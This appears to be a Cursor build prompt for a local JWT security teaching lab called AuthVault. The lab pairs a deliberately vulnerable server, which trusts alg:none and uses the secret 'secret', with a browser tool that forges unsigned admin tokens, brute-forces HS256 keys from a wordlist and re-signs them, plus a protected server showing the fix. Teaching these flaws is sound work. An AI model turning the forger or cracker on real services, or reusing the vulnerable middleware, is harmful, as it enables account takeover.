# Cursor Prompt: JWT Attacks Demo — AuthVault

## Global UI Standard — applies to every server in this lab

| Server type | Theme |
|-------------|-------|
| Attacker server / Attack guide | Clone `DASHBOARD_HTML` from `reverse-tabnabbing/attacker-server.js` — `#0a0a0a` bg, `#00ff41` text, `'Courier New'` font. Copy `<style>` verbatim. |
| Internal / target server | Muted corporate — `#1a1a2e` bg, `#e2e8f0` text |
| Victim servers | Realistic product UI matching their brand |

**Attacker/guide pages — non-negotiable rules:**
- Copy the `<style>` block from `DASHBOARD_HTML` in `reverse-tabnabbing/attacker-server.js` **verbatim**. Never recreate or paraphrase it.
- Body layout: `padding: 2rem` on body. No max-width wrapper div. No centering.
- Panels: use `.flow-box` and `.credentials-panel` classes (defined in that style block). These must be full-width — never add `max-width` to them, not in CSS and not as inline `style` attributes. Only `<p>` text elements may use `max-width` for line-length readability.
- Navigation: **fixed bottom-left `target-switcher` only.** No other open/link buttons anywhere on the page.

---

## Context

Part of the security attack demonstration lab at
https://github.com/EverythingFromDayOne/demo-attacked-web.
Previous demos: XSS (3001–3009), CSRF (3010–3012), Clickjacking (3013–3015),
Reverse Tabnabbing (3016–3018), SSRF (3019–3021), NoSQL Injection (3022–3024),
SQL Injection (3025–3027), Prototype Pollution (3028–3030),
Event Loop Blocking (3031–3033).
This demo lives under `demo-attacked/jwt-attacks/` using ports 3034–3036.

Tech stack: Node.js + Express. All HTML as template literals. Vanilla CSS/JS.
Uses `jsonwebtoken` and `cors` — both must be installed.

---

## Files to create

```
demo-attacked/jwt-attacks/
├── victim-server.js           # AuthVault vulnerable    — port 3034
├── attack-guide-server.js     # JWT Attack Lab          — port 3035
├── victim-server-protected.js # AuthVault protected     — port 3036
├── package.json
└── README.md
```

`package.json` scripts:
```json
{
  "scripts": {
    "victim":           "node victim-server.js",
    "guide":            "node attack-guide-server.js",
    "victim-protected": "node victim-server-protected.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "jsonwebtoken": "^9.0.0",
    "cors": "^2.8.5"
  }
}
```

---

## Scenario

**AuthVault** — an API key management dashboard for developer teams. Users log
in and receive a JWT. The token is used for every subsequent API call. The
vulnerable server has two independent JWT flaws that can be exploited without
knowing any password.

The attack guide (port 3035) is a live JWT manipulation tool: paste a token,
forge a new one with `alg:none`, or crack the HS256 secret client-side using
the Web Crypto API — all in the browser, no external tools.

---

## Shared in-memory users (same in all three servers)

```js
const USERS = [
  { id: 1, username: 'alice',  password: 'hunter2',      role: 'developer' },
  { id: 2, username: 'bob',    password: 'correct-horse', role: 'developer' },
  { id: 3, username: 'admin',  password: 'Adm1nS3cr3t!', role: 'admin'     },
];
```

---

## The two attack vectors

### Vector 1 — alg:none (unsigned token)

The JWT spec allows `"alg": "none"` to signal an unsecured token with no
signature. The vulnerable server checks the `alg` field from the token header
itself and skips signature verification when `alg` is `"none"`.

Attack: take any valid HS256 token, decode it, change `role` to `"admin"`,
re-encode with `"alg": "none"` in the header, strip the signature, send as
`Bearer <header>.<payload>.` (trailing dot, empty signature).

### Vector 2 — Weak HS256 secret

The vulnerable server signs tokens with `"secret"` as the HMAC key. An attacker
who obtains any token (e.g. from their own login) can try common words against
the signature using the Web Crypto API until one produces a matching HMAC. Once
the secret is found, they can sign new tokens with any payload they want.

---

## Port 3034 — Vulnerable AuthVault

### Signing secret & in-memory denylist

```js
const JWT_SECRET = 'secret'; // ⚠️ weak — brute-forceable in milliseconds
const JWT_EXPIRES = '2h';

// In-memory token denylist — stores jti values of logged-out tokens
// ⚠️ Lost on restart; not shared across instances — this limitation is part of the demo
const tokenDenylist = new Set();
```

### Token middleware (vulnerable)

```js
function verifyToken(req, res, next) {
  const auth = req.headers.authorization || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : '';
  if (!token) return res.status(401).json({ error: 'No token provided' });

  try {
    const parts = token.split('.');
    if (parts.length !== 3) throw new Error('Malformed token');

    // ⚠️ Read algorithm from the token header — never trust the header
    const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());

    if (header.alg === 'none') {
      // ⚠️ Accept unsigned tokens — no signature check at all
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
      if (payload.jti && tokenDenylist.has(payload.jti)) {
        return res.status(401).json({ error: 'Token has been revoked' });
      }
      req.user = payload;
      return next();
    }

    // ⚠️ For HS256: uses weak secret, no algorithm whitelist
    req.user = jwt.verify(token, JWT_SECRET);
    if (req.user.jti && tokenDenylist.has(req.user.jti)) {
      return res.status(401).json({ error: 'Token has been revoked' });
    }
    next();
  } catch (err) {
    res.status(401).json({ error: 'Token error: ' + err.message });
  }
}
```

### Routes

**`POST /api/login`** — body `{ username, password }` → returns JWT on success.

```js
const { randomBytes } = require('crypto');

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const user = USERS.find(u => u.username === username && u.password === password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  const token = jwt.sign(
    {
      sub: String(user.id),
      username: user.username,
      role: user.role,
      jti: randomBytes(16).toString('hex')  // unique token ID — used for revocation
    },
    JWT_SECRET,
    { algorithm: 'HS256', expiresIn: JWT_EXPIRES }
  );
  res.json({ token, user: { username: user.username, role: user.role } });
});
```

**`GET /api/profile`** — protected by `verifyToken`. Returns `req.user`.

**`GET /api/admin`** — protected by `verifyToken`. Checks `req.user.role === 'admin'`.
- If admin: returns full user list with roles (the "secret" data)
- If not admin: 403 `{ error: 'Admin only' }`

**`GET /api/whoami`** — protected by `verifyToken`. Returns decoded token payload.
Used by the attack guide to confirm a forged token was accepted.

**`POST /api/logout`** — protected by `verifyToken`. Adds token's `jti` to denylist:

```js
app.post('/api/logout', verifyToken, (req, res) => {
  if (req.user.jti) tokenDenylist.add(req.user.jti);
  res.json({ message: 'Logged out — token revoked' });
});
```

### Pages

**`GET /`** — AuthVault dashboard

Clean product UI. Dark sidebar (`#1e293b`), white content area.
Navigation: `AuthVault` logo + links `Dashboard · API Keys · Team · Admin`.

Amber top banner:
```
⚠  VULNERABLE: JWT middleware trusts alg header — accepts unsigned tokens; secret is "secret"
```

Left sidebar: user avatar + username + role badge (developer/admin). Below the role badge, a "Sign Out" button:

```html
<button id="btn-logout" style="
  margin-top:1rem;width:100%;padding:0.5rem;
  background:transparent;border:1px solid #475569;
  color:#94a3b8;border-radius:4px;cursor:pointer;font-size:0.8rem;
">Sign Out</button>
```

Logout JS (inline `<script>` on dashboard page):

```js
document.getElementById('btn-logout').addEventListener('click', async function() {
  var token = localStorage.getItem('authToken');
  if (token) {
    try { await fetch('/api/logout', { method:'POST', headers:{'Authorization':'Bearer '+token} }); }
    catch(e) { /* clear local state regardless */ }
  }
  localStorage.removeItem('authToken');
  window.location.href = '/login';
});
```

Main content — three panels:

**Panel 1 — Your JWT**
After login: shows the active JWT in a read-only textarea (monospace, full token).
Below it: decoded header + payload shown as formatted JSON.
"Copy Token" button.

**Panel 2 — API Keys**
Shows 3 mock API keys (blurred: `sk_live_••••••••••••••••`).
Note: "Login required. Your role: developer. Admin keys are hidden."

**Panel 3 — Team (admin only)**
If `role !== 'admin'`: grey locked panel, padlock icon, "Admin access required."
If `role === 'admin'`: table of all users with their roles and a fake API key each.
Red banner: `"🚨 ADMIN ACCESS GRANTED — all team secrets visible"`

**`GET /login`** — Login form page.

Username + password inputs, Sign In button. On submit: `POST /api/login`,
stores token in `localStorage`, redirects to `/`.

**`GET /admin-panel`** — fetches `GET /api/admin` with stored token,
renders result or access-denied message.

Enable CORS on port 3034 so the attack guide can make cross-origin fetch calls:
```js
const cors = require('cors');
app.use(cors({ origin: 'http://localhost:3035' }));
```

---

## Port 3035 — JWT Attack Lab (guide + live tool)

### UI — MANDATORY: clone from reverse-tabnabbing dashboard

Open `demo-attacked/reverse-tabnabbing/attacker-server.js`. Find the
`DASHBOARD_HTML` constant. Copy its entire `<style>` block **verbatim**. Do not
reinterpret or recreate any CSS. Also copy `SWITCHER_CSS` verbatim.

Body: `padding: 2rem`. No wrapper div. No centering.
Panels: `.flow-box` + `.credentials-panel` from that style block.

Also add these extra styles (append inside `<style>`, after the verbatim block):
```css
textarea.token-input {
  width: 100%;
  background: #111;
  border: 1px solid #1a3a1a;
  color: #00ff41;
  font-family: 'Courier New', Courier, monospace;
  font-size: 0.78rem;
  padding: 0.75rem;
  border-radius: 4px;
  resize: vertical;
  min-height: 80px;
}
.decoded-box {
  background: #0a0a0a;
  border: 1px solid #1a3a1a;
  border-radius: 4px;
  padding: 0.75rem;
  font-size: 0.78rem;
  color: #cbd5e1;
  white-space: pre-wrap;
  word-break: break-all;
  min-height: 60px;
  margin-top: 0.5rem;
}
.result-banner {
  padding: 0.6rem 1rem;
  border-radius: 4px;
  font-size: 0.82rem;
  margin-top: 0.75rem;
  display: none;
}
.result-banner.success { background: #052e16; border: 1px solid #16a34a; color: #4ade80; }
.result-banner.failure { background: #450a0a; border: 1px solid #dc2626; color: #fca5a5; }
.result-banner.info    { background: #0c1a2e; border: 1px solid #1e40af; color: #93c5fd; }
input.field {
  background: #111;
  border: 1px solid #1a3a1a;
  color: #00ff41;
  font-family: 'Courier New', Courier, monospace;
  font-size: 0.82rem;
  padding: 0.4rem 0.6rem;
  border-radius: 4px;
}
```

**Fixed bottom-left switcher ONLY:**
```html
<div class="target-switcher">
  <button class="btn-vulnerable" id="btn-switcher-vulnerable">Vulnerable (:3034)</button>
  <button class="btn-protected" id="btn-switcher-protected">Protected (:3036)</button>
</div>
```

Switcher JS:
```js
document.getElementById('btn-switcher-vulnerable').addEventListener('click', function () {
  window.open('http://localhost:3034', '_blank');
});
document.getElementById('btn-switcher-protected').addEventListener('click', function () {
  window.open('http://localhost:3036', '_blank');
});
```

### `GET /` — page content

```html
<body>
  <h1>JWT Attack Lab</h1>
  <p class="subtitle">Forge unsigned tokens and crack weak secrets — no password needed</p>

  <!-- How JWT works -->
  <div class="flow-box">
    <strong>JWT STRUCTURE</strong><br><br>
    <pre>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← header  (base64url JSON)
.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhbGljZSIsInJvbGUiOiJkZXZlbG9wZXIifQ  ← payload
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   ← signature (HMAC-SHA256 or RSA)

The signature is the ONLY thing that prevents tampering.
If the server does not verify it — or trusts the alg header — it is useless.</pre>
  </div>

  <!-- Step 0: Login first to get a real token -->
  <div class="credentials-panel">
    <h2>Step 0 — Get a Real Token</h2>
    <p style="font-size:0.85rem;color:#94a3b8;margin-bottom:0.75rem;max-width:640px">
      Log in as alice to get a valid HS256 token. Both attacks below start from this token.
    </p>
    <div style="display:flex;gap:0.6rem;flex-wrap:wrap;align-items:center">
      <input class="field" id="login-user" value="alice" style="width:120px">
      <input class="field" id="login-pass" value="hunter2" type="password" style="width:120px">
      <button class="demo-btn" id="btn-login">Login → :3034</button>
    </div>
    <div class="result-banner" id="login-result"></div>
    <div style="margin-top:0.75rem">
      <div style="font-size:0.75rem;color:#64748b;margin-bottom:0.35rem">Your token:</div>
      <textarea class="token-input" id="token-display" rows="3" placeholder="Token will appear here after login"></textarea>
    </div>
    <div style="margin-top:0.5rem">
      <div style="font-size:0.75rem;color:#64748b;margin-bottom:0.35rem">Decoded payload:</div>
      <div class="decoded-box" id="decoded-display">—</div>
    </div>
  </div>

  <!-- Attack 1: alg:none -->
  <div class="credentials-panel" style="margin-top:2rem">
    <h2>Attack 1 — alg:none (Unsigned Token Forgery)</h2>
    <p style="font-size:0.85rem;color:#94a3b8;margin-bottom:0.75rem;max-width:640px">
      Change the algorithm to <code>none</code>, set <code>role</code> to <code>admin</code>,
      strip the signature. The vulnerable server reads <code>alg</code> from the header itself
      and skips verification.
    </p>
    <div style="display:flex;gap:0.6rem;flex-wrap:wrap;align-items:center;margin-bottom:0.6rem">
      <label style="font-size:0.82rem;color:#94a3b8">Set role to:</label>
      <input class="field" id="forge-role" value="admin" style="width:120px">
      <label style="font-size:0.82rem;color:#94a3b8">username:</label>
      <input class="field" id="forge-username" value="alice" style="width:120px">
      <button class="demo-btn" id="btn-forge">⚡ Forge alg:none Token</button>
    </div>
    <div style="margin-top:0.5rem">
      <div style="font-size:0.75rem;color:#64748b;margin-bottom:0.35rem">Forged token:</div>
      <textarea class="token-input" id="forged-token" rows="3" placeholder="Forged token will appear here"></textarea>
    </div>
    <div style="margin-top:0.6rem;display:flex;gap:0.6rem;flex-wrap:wrap">
      <button class="demo-btn" id="btn-test-forged-vulnerable">Test on Vulnerable :3034</button>
      <button class="demo-btn" id="btn-test-forged-protected">Test on Protected :3036</button>
    </div>
    <div class="result-banner" id="forge-result"></div>
    <div style="margin-top:1rem">
      <div class="flow-box" style="margin-bottom:0">
        <strong>HOW THE FORGERY WORKS</strong><br><br>
        <pre>// 1. Decode original token (no verification needed — just base64)
header  = { alg: 'HS256', typ: 'JWT' }
payload = { sub: '1', username: 'alice', role: 'developer', ... }

// 2. Modify
header.alg   = 'none'
payload.role = 'admin'

// 3. Re-encode — NO signature
forgedToken = base64url(JSON.stringify(header))
            + '.'
            + base64url(JSON.stringify(payload))
            + '.'    // ← trailing dot, empty signature

// 4. Server receives token, reads header.alg === 'none', skips verification
// → accepts the token, grants admin access</pre>
      </div>
    </div>
  </div>

  <!-- Attack 2: Weak secret cracker -->
  <div class="credentials-panel" style="margin-top:2rem">
    <h2>Attack 2 — Weak Secret Crack + Re-sign</h2>
    <p style="font-size:0.85rem;color:#94a3b8;margin-bottom:0.75rem;max-width:640px">
      Try common strings against the token's HMAC signature using the browser's
      Web Crypto API. When the secret is found, re-sign a new token with
      <code>role: admin</code>.
    </p>
    <div style="display:flex;gap:0.6rem;flex-wrap:wrap;align-items:center;margin-bottom:0.6rem">
      <button class="demo-btn" id="btn-crack">⚡ Crack HS256 Secret</button>
      <span id="crack-progress" style="font-size:0.82rem;color:#64748b"></span>
    </div>
    <div class="result-banner" id="crack-result"></div>
    <div style="margin-top:0.75rem">
      <div style="font-size:0.75rem;color:#64748b;margin-bottom:0.35rem">Re-signed admin token (after crack):</div>
      <textarea class="token-input" id="cracked-token" rows="3" placeholder="Will appear after secret is found"></textarea>
    </div>
    <div style="margin-top:0.6rem;display:flex;gap:0.6rem;flex-wrap:wrap">
      <button class="demo-btn" id="btn-test-cracked-vulnerable">Test on Vulnerable :3034</button>
      <button class="demo-btn" id="btn-test-cracked-protected">Test on Protected :3036</button>
    </div>
    <div class="result-banner" id="cracked-test-result"></div>
    <div style="margin-top:1rem">
      <div class="flow-box" style="margin-bottom:0">
        <strong>HOW THE CRACK WORKS</strong><br><br>
        <pre>// HMAC-SHA256: signature = HMAC(secret, header + '.' + payload)
// To verify: recompute HMAC with candidate secret, compare to signature

// Web Crypto API (browser-native, no libraries):
const key = await crypto.subtle.importKey(
  'raw', new TextEncoder().encode(candidateSecret),
  { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
);
const computed = await crypto.subtle.sign(
  'HMAC', key,
  new TextEncoder().encode(headerB64 + '.' + payloadB64)
);
const b64 = btoa(String.fromCharCode(...new Uint8Array(computed)))
  .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');

if (b64 === signatureB64) { /* secret found! */ }</pre>
      </div>
    </div>
  </div>

  <!-- The fix -->
  <div class="credentials-panel" style="margin-top:2rem">
    <h2>The Fix</h2>
    <pre>// ✅ Whitelist the algorithm — never read it from the token header
const payload = jwt.verify(token, JWT_SECRET, {
  algorithms: ['HS256']  // ← explicit list; 'none' is never in it
});

// ✅ Use a strong secret — 256+ bits of randomness
const JWT_SECRET = require('crypto').randomBytes(64).toString('hex');
// Store in environment variable, not hardcoded

// ✅ Do NOT use jwt.decode() for auth — it skips verification entirely
// jwt.decode() is only for reading a token you've already verified</pre>
  </div>

  <!-- Bonus: JWT Logout Problem -->
  <div class="credentials-panel" style="margin-top:2rem">
    <h2>Bonus — The JWT Logout Problem</h2>
    <p style="font-size:0.85rem;color:#94a3b8;margin-bottom:0.75rem;max-width:720px">
      Both victim servers now have a Logout button. Try this sequence to see the
      revocation mechanism — and its limits.
    </p>
    <div class="flow-box">
      <strong>EXPERIMENT</strong><br><br>
      <pre>1. Log in at :3034 as alice → copy the token (it appears in Step 0 above)
2. Open :3034 — click "Sign Out" → server adds token's jti to its denylist Set
3. Click "Test Revoked Token on :3034" below → 401 "Token has been revoked"
4. Now restart the :3034 server (Ctrl+C in terminal, npm run victim again)
5. Click "Test Revoked Token" again → 200 OK — token works again
   The denylist lived only in memory. Restart = empty Set = revocation gone.</pre>
    </div>
    <div style="margin-top:1rem;display:flex;gap:0.6rem;flex-wrap:wrap;align-items:center">
      <button class="demo-btn" id="btn-test-revoked">Test Revoked Token on :3034</button>
      <span style="font-size:0.8rem;color:#64748b">(token from Step 0)</span>
    </div>
    <div class="result-banner" id="revoked-result"></div>
    <div class="flow-box" style="margin-top:1rem">
      <strong>WHY JWT LOGOUT IS HARD</strong><br><br>
      <pre>Stateless JWT (no revocation):
  login → server issues signed token
  request → server verifies signature → done, no state needed
  "logout" → clear localStorage → token still valid anywhere that has it

Denylist (what we built):
  POST /api/logout → adds jti to in-memory Set
  Every request → check Set after verification
  Problem 1: Set lost on server restart
  Problem 2: multiple server instances each have separate Sets → inconsistent
  Real fix: Redis (shared, persistent) — but now JWT is stateful

Short-lived tokens + refresh tokens (production pattern):
  access token: 15min exp — short enough revocation barely matters
  refresh token: 7d, HttpOnly cookie, stored in DB, revocable
  On logout: delete refresh token row → no new access tokens issued
  Old access tokens expire naturally within 15 minutes

Bottom line: stateless JWTs cannot be instantly revoked without server state.
  Need instant revocation? Redis denylist or very short exp.
  At that point, traditional session cookies may be simpler.</pre>
    </div>
  </div>

  <!-- fixed bottom-left switcher -->
</body>
```

### JavaScript for the attack guide

All JWT manipulation runs entirely client-side using `atob`/`btoa` and the
Web Crypto API. No server-side JWT dependency needed on port 3035.

```js
// --- Utilities ---

function b64urlEncode(str) {
  return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

function b64urlDecode(str) {
  str = str.replace(/-/g, '+').replace(/_/g, '/');
  while (str.length % 4) str += '=';
  return atob(str);
}

function decodeJwt(token) {
  try {
    var parts = token.trim().split('.');
    if (parts.length < 2) return null;
    return {
      header:  JSON.parse(b64urlDecode(parts[0])),
      payload: JSON.parse(b64urlDecode(parts[1])),
      parts:   parts
    };
  } catch (e) { return null; }
}

function showBanner(id, type, msg) {
  var el = document.getElementById(id);
  el.className = 'result-banner ' + type;
  el.textContent = msg;
  el.style.display = 'block';
}

// --- Step 0: Login ---

document.getElementById('btn-login').addEventListener('click', async function () {
  var username = document.getElementById('login-user').value;
  var password = document.getElementById('login-pass').value;
  try {
    var res = await fetch('http://localhost:3034/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    var data = await res.json();
    if (!res.ok) { showBanner('login-result', 'failure', '✗ ' + data.error); return; }
    document.getElementById('token-display').value = data.token;
    var decoded = decodeJwt(data.token);
    document.getElementById('decoded-display').textContent =
      JSON.stringify(decoded.payload, null, 2);
    // Pre-fill attacker fields
    document.getElementById('forge-username').value = decoded.payload.username || username;
    showBanner('login-result', 'success', '✓ Logged in as ' + data.user.username + ' (role: ' + data.user.role + ')');
  } catch (e) {
    showBanner('login-result', 'failure', '✗ ' + e.message);
  }
});

// --- Attack 1: alg:none forger ---

document.getElementById('btn-forge').addEventListener('click', function () {
  var tokenStr = document.getElementById('token-display').value.trim();
  if (!tokenStr) { showBanner('forge-result', 'failure', '✗ Login first to get a token'); return; }
  var decoded = decodeJwt(tokenStr);
  if (!decoded) { showBanner('forge-result', 'failure', '✗ Could not decode token'); return; }

  var newHeader  = { alg: 'none', typ: 'JWT' };
  var newPayload = Object.assign({}, decoded.payload, {
    role: document.getElementById('forge-role').value || 'admin',
    username: document.getElementById('forge-username').value || decoded.payload.username
  });

  var forged = b64urlEncode(JSON.stringify(newHeader))
             + '.' + b64urlEncode(JSON.stringify(newPayload))
             + '.';  // empty signature

  document.getElementById('forged-token').value = forged;
  showBanner('forge-result', 'info', 'ℹ Token forged. alg set to "none", signature stripped. Click Test to send it.');
});

async function testToken(tokenFieldId, resultId, port) {
  var token = document.getElementById(tokenFieldId).value.trim();
  if (!token) { showBanner(resultId, 'failure', '✗ No token to test'); return; }
  try {
    var res = await fetch('http://localhost:' + port + '/api/admin', {
      headers: { 'Authorization': 'Bearer ' + token }
    });
    var data = await res.json();
    if (res.ok) {
      showBanner(resultId, 'success', '🚨 ADMIN ACCESS GRANTED on :' + port + ' — ' + JSON.stringify(data).slice(0, 120));
    } else {
      showBanner(resultId, 'failure', '✗ Rejected by :' + port + ' — ' + data.error);
    }
  } catch (e) {
    showBanner(resultId, 'failure', '✗ ' + e.message);
  }
}

document.getElementById('btn-test-forged-vulnerable').addEventListener('click', function () {
  testToken('forged-token', 'forge-result', 3034);
});
document.getElementById('btn-test-forged-protected').addEventListener('click', function () {
  testToken('forged-token', 'forge-result', 3036);
});

// --- Attack 2: HS256 secret cracker ---

const WORDLIST = [
  'secret','password','123456','jwt','jwt_secret','mysecret','supersecret',
  'password123','qwerty','abc123','token','mykey','secretkey','key',
  'auth','jwtkey','private','test','dev','development','prod','production',
  'changeme','letmein','welcome','admin','root','toor','pass','passw0rd',
  'p@ssword','iloveyou','sunshine','monkey','dragon','master','hello',
  'shadow','batman','trustno1','letmein123','1234','12345','1234567890'
];

async function trySecret(parts, candidate) {
  var msg = parts[0] + '.' + parts[1];
  var key = await crypto.subtle.importKey(
    'raw', new TextEncoder().encode(candidate),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
  );
  var sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(msg));
  var b64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
  return b64 === parts[2] ? candidate : null;
}

async function resignToken(parts, secret, newPayload) {
  // Rebuild payload with modified claims
  var header = b64urlEncode(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  var payload = b64urlEncode(JSON.stringify(newPayload));
  var msg = header + '.' + payload;
  var key = await crypto.subtle.importKey(
    'raw', new TextEncoder().encode(secret),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
  );
  var sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(msg));
  var b64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
  return msg + '.' + b64;
}

document.getElementById('btn-crack').addEventListener('click', async function () {
  var tokenStr = document.getElementById('token-display').value.trim();
  if (!tokenStr) { showBanner('crack-result', 'failure', '✗ Login first to get a token'); return; }
  var decoded = decodeJwt(tokenStr);
  if (!decoded || decoded.header.alg !== 'HS256') {
    showBanner('crack-result', 'failure', '✗ Token must be HS256'); return;
  }
  var parts = tokenStr.trim().split('.');
  var progress = document.getElementById('crack-progress');
  var found = null;

  for (var i = 0; i < WORDLIST.length; i++) {
    progress.textContent = 'Trying ' + (i + 1) + '/' + WORDLIST.length + ': "' + WORDLIST[i] + '"...';
    found = await trySecret(parts, WORDLIST[i]);
    if (found) break;
    // Yield to event loop every 5 tries so the UI updates
    if (i % 5 === 0) await new Promise(function(r) { setTimeout(r, 0); });
  }

  if (found) {
    progress.textContent = '';
    showBanner('crack-result', 'success', '✓ Secret cracked: "' + found + '" — re-signing with role:admin');
    // Re-sign with admin payload
    var adminPayload = Object.assign({}, decoded.payload, { role: 'admin' });
    var newToken = await resignToken(parts, found, adminPayload);
    document.getElementById('cracked-token').value = newToken;
  } else {
    progress.textContent = '';
    showBanner('crack-result', 'failure', '✗ Secret not in wordlist — try a longer wordlist');
  }
});

document.getElementById('btn-test-cracked-vulnerable').addEventListener('click', function () {
  testToken('cracked-token', 'cracked-test-result', 3034);
});
document.getElementById('btn-test-cracked-protected').addEventListener('click', function () {
  testToken('cracked-token', 'cracked-test-result', 3036);
});

// --- Bonus: Test Revoked Token ---

document.getElementById('btn-test-revoked').addEventListener('click', async function () {
  var token = document.getElementById('token-display').value.trim();
  if (!token) { showBanner('revoked-result', 'failure', '✗ Paste a token in Step 0 first'); return; }
  try {
    var res = await fetch('http://localhost:3034/api/whoami', {
      headers: { 'Authorization': 'Bearer ' + token }
    });
    var data = await res.json();
    if (res.ok) {
      showBanner('revoked-result', 'info', 'ℹ Token still valid — ' + JSON.stringify(data));
    } else {
      showBanner('revoked-result', 'success', '✓ Token rejected: "' + data.error + '" — denylist working');
    }
  } catch (e) {
    showBanner('revoked-result', 'failure', '✗ ' + e.message);
  }
});
```

---

## Port 3036 — Protected AuthVault

Same UI as port 3034. Replace amber banner with green:
```
✅ PROTECTED: algorithm whitelist enforced; secret is cryptographically random
```

### Signing secret & in-memory denylist

```js
const { randomBytes } = require('crypto');

// ✅ Cryptographically random 64-byte secret — not guessable
// In production this would come from an environment variable
const JWT_SECRET = randomBytes(64).toString('hex');

// Same denylist pattern as the vulnerable server — revocation works the same way
// The point: this limitation applies regardless of how strong your secret or algorithm is
const tokenDenylist = new Set();
```

Note: because the secret is randomly generated on startup, tokens from port 3034
will not be valid on port 3036 (different secret). Users must log in separately.
This is intentional and should be noted in the UI.

### Token middleware (protected)

```js
function verifyToken(req, res, next) {
  const auth = req.headers.authorization || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : '';
  if (!token) return res.status(401).json({ error: 'No token provided' });

  try {
    // ✅ Algorithm is hardcoded here — never read from the token header
    // ✅ 'none' is not in the whitelist — unsigned tokens always rejected
    req.user = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });
    if (req.user.jti && tokenDenylist.has(req.user.jti)) {
      return res.status(401).json({ error: 'Token has been revoked' });
    }
    next();
  } catch (err) {
    res.status(401).json({ error: 'Token rejected: ' + err.message });
  }
}
```

All other routes (`/api/login`, `/api/profile`, `/api/admin`, `/api/whoami`) are identical
to port 3034 but use the protected middleware and strong secret. Add `jti` to the sign call
(same `randomBytes(16).toString('hex')` pattern). Also add `POST /api/logout` (same
implementation — `verifyToken` runs first, adds `req.user.jti` to denylist). Also add the
"Sign Out" sidebar button and logout JS (same as port 3034). Below the button add a muted note:
`"Note: tokens from :3034 are not valid here — different secret. Log in separately."`

Also enable CORS for the attack guide:
```js
app.use(cors({ origin: 'http://localhost:3035' }));
```

---

## README.md

### Attack Flow

```
Attack 1 — alg:none
  Valid token header: { "alg": "HS256", "typ": "JWT" }
  Attacker modifies: { "alg": "none",  "typ": "JWT" } + strips signature
        ↓
  AuthVault (3034): jwt.verify() reads alg FROM the token → skips HMAC check
        ↓
  Forged token accepted. role set to "admin". No secret needed.

Attack 2 — weak secret brute-force
  Attacker runs: HMAC-SHA256(header.payload, "secret") → matches token signature
        ↓
  Signs new token with role:"admin" using "secret"
        ↓
  Server accepts — valid signature, just forged payload
```

### Port Reference

| Port | Role | File |
|------|------|------|
| 3034 | Vulnerable AuthVault | `victim-server.js` |
| 3035 | JWT Attack Lab | `attack-guide-server.js` |
| 3036 | Protected AuthVault | `victim-server-protected.js` |

### Setup

```bash
cd demo-attacked/jwt-attacks
npm install   # installs jsonwebtoken + cors
```

### Attack Walkthrough — alg:none

**Terminal 1:** `npm run victim`
**Terminal 2:** `npm run guide`

1. Open **localhost:3035**
2. Click **Login → :3034** (alice / hunter2) — copy the token
3. Click **⚡ Forge alg:none Token** — role set to admin
4. Click **Test on Vulnerable :3034** — `🚨 ADMIN ACCESS GRANTED`
5. Click **Test on Protected :3036** — `✗ Rejected`

### Attack Walkthrough — Weak Secret

1. With a token from alice's login in the token field
2. Click **⚡ Crack HS256 Secret** — watch it try the wordlist
3. In ~40 tries it finds `"secret"`
4. A re-signed admin token appears automatically
5. Click **Test on Vulnerable :3034** — `🚨 ADMIN ACCESS GRANTED`
6. Click **Test on Protected :3036** — `✗ Rejected` (different, unguessable secret)

### Vulnerable Lines

```js
// ⚠️ Trusts the alg field from the token header
const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
if (header.alg === 'none') { /* skip verification */ }

// ⚠️ Weak secret — in the wordlist
const JWT_SECRET = 'secret';
```

### The Fix

```js
// ✅ Never read alg from the token — whitelist it here
jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });

// ✅ Strong secret
const JWT_SECRET = require('crypto').randomBytes(64).toString('hex');
// Stored in process.env.JWT_SECRET, not hardcoded
```

### Logout — JWT Revocation Demo

1. Log in at **localhost:3034** → copy the token → click "Sign Out"
2. Go to the attack guide (3035) → paste the old token in Step 0 → click **Test Revoked Token on :3034** → `✓ Token rejected: "Token has been revoked"`
3. Restart the `:3034` server (`Ctrl+C`, `npm run victim`) → test again → token accepted again
4. This demonstrates: **in-memory denylists are not persistent** — production requires Redis or a database.

### Why jwt.decode() is dangerous

`jwt.decode()` in the `jsonwebtoken` package decodes a JWT without verifying
the signature. It should only be used AFTER `jwt.verify()` — never as a
replacement. Using `jwt.decode()` for authorization is equivalent to having no
auth at all.
